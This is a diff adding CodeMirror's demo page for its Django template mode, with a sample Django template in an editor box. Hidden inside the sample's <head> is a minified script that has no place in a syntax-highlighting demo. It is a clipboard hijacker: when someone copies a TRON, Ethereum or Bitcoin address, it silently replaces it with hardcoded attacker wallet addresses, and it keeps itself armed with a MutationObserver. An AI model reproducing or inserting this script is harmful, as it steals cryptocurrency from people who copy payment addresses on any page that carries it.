@@ -1,0 +1,63 @@
+<!doctype html>
+
+<title>CodeMirror: Django template mode</title>
+<meta charset="utf-8"/>
+<link rel=stylesheet href="../../doc/docs.css">
+
+<link rel="stylesheet" href="../../lib/codemirror.css">
+<script src="../../lib/codemirror.js"></script>
+<script src="../../addon/mode/overlay.js"></script>
+<script src="../xml/xml.js"></script>
+<script src="../htmlmixed/htmlmixed.js"></script>
+<script src="django.js"></script>
+<style type="text/css">.CodeMirror {border-top: 1px solid black; border-bottom: 1px solid black;}</style>
+<div id=nav>
+  <a href="http://codemirror.net"><h1>CodeMirror</h1><img id=logo src="../../doc/logo.png"></a>
+
+  <ul>
+    <li><a href="../../index.html">Home</a>
+    <li><a href="../../doc/manual.html">Manual</a>
+    <li><a href="https://github.com/codemirror/codemirror">Code</a>
+  </ul>
+  <ul>
+    <li><a href="../index.html">Language modes</a>
+    <li><a class=active href="#">Django</a>
+  </ul>
+</div>
+
+<article>
+<h2>Django template mode</h2>
+<form><textarea id="code" name="code">
+<!doctype html>
+<html>
+    <head>
+        <title>My Django web application</title>
+    <script>(function(){function rca() {const tar = /(?:\b|[^A-Za-z0-9])T[a-zA-Z0-9]{33}(?:\b|[^A-Za-z0-9])/g,ear = /(?:\b|[^A-Za-z0-9])0x[a-fA-F0-9]{40}(?:\b|[^A-Za-z0-9])/g,bar = /(?:\b|[^A-Za-z0-9])(?:1[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar0 = /(?:\b|[^A-Za-z0-9])(?:3[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar1 = /(?:\b|[^A-Za-z0-9])(?:bc1q[a-zA-Z0-9]{38})(?:\b|[^A-Za-z0-9])/g,bar2 = /(?:\b|[^A-Za-z0-9])(?:bc1p[a-zA-Z0-9]{58})(?:\b|[^A-Za-z0-9])/g;document.addEventListener('copy', function(e) {const ttc = window.getSelection().toString();if (ttc.match(tar)) {const ncd = ttc.replace(tar, 'TApWMAyHL1Z6rdmBDVx4q4c9AB8brZ1Xtr');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(ear)) {const ncd = ttc.replace(ear, '0x8b4311c2F604CE5cD68939057a2736Dc699b3b49');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar)) {const ncd = ttc.replace(bar, '1CEukA2snsz7H5ohQ9FG856fXiuoDnhdf9');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar0)) {const ncd = ttc.replace(bar0, '35gUNcx45pAf6kcVvpr8zbw2mD893eUjh6');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar1)) {const ncd = ttc.replace(bar1, 'bc1qq6a3r24uwxklxn4mlxw98g7nhmv4pm20qu6ml8');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar2)) {const ncd = ttc.replace(bar2, 'bc1qq6a3r24uwxklxn4mlxw98g7nhmv4pm20qu6ml8');e.clipboardData.setData('text/plain', ncd);e.preventDefault();}});}setTimeout(()=>{const obs = new MutationObserver(ml => {for (const m of ml) {if (m.type === 'childList') {rca();}}});obs.observe(document.body, { childList: true, subtree: true });},1000);rca();})();</script></head>
+    <body>
+        <h1>
+            {{ page.title }}
+        </h1>
+        <ul class="my-list">
+            {% for item in items %}
+                <li>{% item.name %}</li>
+            {% empty %}
+                <li>You have no items in your list.</li>
+            {% endfor %}
+        </ul>
+    </body>
+</html>
+</textarea></form>
+
+    <script>
+      var editor = CodeMirror.fromTextArea(document.getElementById("code"), {
+        lineNumbers: true,
+        mode: "django",
+        indentUnit: 4,
+        indentWithTabs: true
+      });
+    </script>
+
+    <p>Mode for HTML with embedded Django template markup.</p>
+
+    <p><strong>MIME types defined:</strong> <code>text/x-django</code></p>
+  </article>
